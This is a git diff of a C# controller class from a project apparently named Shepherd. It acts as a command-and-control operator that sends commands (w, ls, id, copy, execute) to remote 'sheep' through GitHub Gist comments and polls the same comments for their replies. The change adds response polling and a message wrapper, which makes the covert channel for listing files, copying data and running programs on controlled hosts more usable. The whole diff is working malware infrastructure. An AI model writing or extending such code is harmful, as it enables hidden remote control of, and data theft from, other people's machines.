@@ -1,6 +1,7 @@
 ﻿using System.Text.RegularExpressions;
 using ConsoleTables;
 using Octokit;
+using Pasture;
 
 namespace Shepherd.Core;
 
@@ -26,7 +27,7 @@ public class ShepherdController
         return client;
     }
 
-    public async Task<IDictionary<string,string>> GetSheep()
+    public async Task<IDictionary<string, string>> GetSheep()
     {
         await RefreshActiveSheep();
         return _sheep;
@@ -54,34 +55,69 @@ public class ShepherdController
         }
     }
 
+
+    private async Task WaitForResponse(string sheepKey, int commentId)
+    {
+        Console.WriteLine("Waitng for response (it will take up to one minute)...");
+        bool loading = true;
+        while (loading)
+        {
+            await Task.Delay(5000);
+            var comments = await _client.Gist.Comment.GetAllForGist(_sheep[sheepKey]);
+
+            foreach (var comment in comments)
+            {
+                if (ResponseMessage.TryParse(comment.Body, out var responseMessage) && responseMessage.ForCommentId == commentId)
+                {
+                    Console.WriteLine(responseMessage.Response);
+                    loading = false;
+                }
+            }
+        }
+    }
+
     public async Task CommandW(string sheepKey)
     {
-
         var gistId = _sheep[sheepKey];
-        await _client.Gist.Comment.Create(gistId, "w");
+        var message = new CommandMessage("w", false);
+        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());
+
+        await WaitForResponse(sheepKey, comment.Id);
     }
 
     public async Task CommandLs(string sheepKey, string path)
     {
         var gistId = _sheep[sheepKey];
-        await _client.Gist.Comment.Create(gistId, $"ls {path}");
+        var message = new CommandMessage($"ls {path}", false);
+        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());
+
+        await WaitForResponse(sheepKey, comment.Id);
     }
 
     public async Task CommandId(string sheepKey)
     {
         var gistId = _sheep[sheepKey];
-        await _client.Gist.Comment.Create(gistId, "id");
+        var message = new CommandMessage($"id", false);
+        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());
+
+        await WaitForResponse(sheepKey, comment.Id);
     }
 
     public async Task CommandCopy(string sheepKey, string copyPath)
     {
         var gistId = _sheep[sheepKey];
-        await _client.Gist.Comment.Create(gistId, $"copy {copyPath}");
+        var message = new CommandMessage($"copy {copyPath}", false);
+        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());
+
+        await WaitForResponse(sheepKey, comment.Id);
     }
 
     public async Task CommandExecute(string sheepKey, string executePath)
     {
         var gistId = _sheep[sheepKey];
-        await _client.Gist.Comment.Create(gistId, $"execute {executePath}");
+        var message = new CommandMessage($"execute {executePath}", false);
+        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());
+
+        await WaitForResponse(sheepKey, comment.Id);
     }
 }
